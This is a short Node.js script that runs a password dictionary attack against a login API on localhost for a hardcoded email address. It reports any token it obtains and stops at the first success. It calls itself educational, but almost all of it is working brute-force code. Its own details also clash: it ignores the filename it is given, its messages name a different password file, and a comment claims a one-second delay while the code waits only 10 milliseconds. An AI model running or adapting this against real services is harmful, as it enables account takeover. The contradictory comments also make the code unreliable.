
//=======================================================================================================================

const axios = require("axios");
const fs = require("fs");

const testLogin = async (identifier, password) => {
  try {
    const response = await axios.post(
      "http://localhost:1337/api/auth/login",
      { identifier, password },
      {
        timeout: 5000,
        validateStatus: (status) => status < 500,
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    console.log(
      `Password: ${password} - Status: ${response.status} - Success: ${
        response.data?.success || false
      }`
    );

    if (response.data?.success) {
      console.log(
        `   ✅ SUCCESS! Token: ${response.data.token.substring(0, 20)}...`
      );
      console.log(
        `   User: ${response.data.user.name} (ID: ${response.data.user.id})`
      );
      return true; // Return true for successful login
    }

    return false;
  } catch (error) {
    console.log(
      `Password: ${password} - Error: ${error.response?.status || error.code}`
    );
    return false;
  }
};

const testIdentifier = "sumit@gmail.com";

// Read passwords from file
const readPasswordsFromFile = (filename) => {
  try {
    const data = fs.readFileSync("./milw0rm-dictionary.txt", "utf8");
    return data
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line.length > 0); // Remove empty lines
  } catch (error) {
    console.error("Error reading password file:", error.message);
    return [];
  }
};

(async () => {
  console.log("🧪 Educational Login Testing - For Learning Purposes Only\n");
  console.log(`Testing identifier: ${testIdentifier}\n`);

  // Read passwords from passwords.txt file
  const testPasswords = readPasswordsFromFile("passwords.txt");

  if (testPasswords.length === 0) {
    console.log("No passwords found in passwords.txt file");
    console.log("Create a passwords.txt file with one password per line");
    return;
  }

  console.log(`Loaded ${testPasswords.length} passwords for testing\n`);

  let successfulLogin = false;

  for (const password of testPasswords) {
    const result = await testLogin(testIdentifier, password);
    if (result) {
      successfulLogin = true;
      console.log(
        `\n🎉 Educational demonstration: Found working password: ${password}`
      );
      break; // Stop testing after successful login
    }
    await new Promise((resolve) => setTimeout(resolve, 10)); // 1 second delay for ethical testing
  }

  if (!successfulLogin) {
    console.log("\n❌ No successful logins found with the provided passwords");
  }

  console.log("\n📚 Educational purpose completed.");
  console.log("Important: This is for learning purposes only.");
  console.log("Always obtain proper authorization before testing any system.");
  console.log(
    "Consider using platforms like TryHackMe for legal security education."
  );
})();

//========================================================================================================================